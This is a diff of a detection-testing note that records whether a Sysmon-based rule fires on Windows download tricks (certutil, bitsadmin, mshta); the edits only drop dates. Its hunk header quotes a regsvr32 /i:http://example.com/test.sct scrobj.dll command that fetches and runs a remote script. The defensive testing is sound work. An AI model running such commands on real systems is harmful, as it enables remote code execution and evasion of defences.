@@ -50,9 +50,9 @@ regsvr32 /s /u /i:http://example.com/test.sct scrobj.dll
 
 ## Observed status
 
-✅ **`certutil -urlcache`** fired the rule on Freddy-PC (2025-12). The Sysmon EventID 1 was emitted, the command line preserved, the rule fired. `certutil` is legitimately invoked by Windows for cert-store maintenance — the `-urlcache` / `-decode` regex anchors guard against false positives.
+✅ **`certutil -urlcache`** fired the rule on Freddy-PC. The Sysmon EventID 1 was emitted, the command line preserved, the rule fired. `certutil` is legitimately invoked by Windows for cert-store maintenance — the `-urlcache` / `-decode` regex anchors guard against false positives.
 
-✅ **`bitsadmin /transfer`** fired the rule on Freddy-PC (2025-12). bitsadmin's interactive output also shows up in Sysmon EventID 1 process-creates for the spawned child operations; only the parent invocation matches the rule, which is correct.
+✅ **`bitsadmin /transfer`** fired the rule on Freddy-PC. bitsadmin's interactive output also shows up in Sysmon EventID 1 process-creates for the spawned child operations; only the parent invocation matches the rule, which is correct.
 
 🟡 **`mshta http://...`** — Defender ASR rule `d3e037e1-3eb8-44c8-a917-57927947596d` (Block JavaScript or VBScript from launching downloaded executable content) blocks the call before the process completes. Sysmon EventID 1 *did* still record the attempted invocation, but only at process-create time before the block; the rule fires on that attempt event. Considered a partial pass.
 
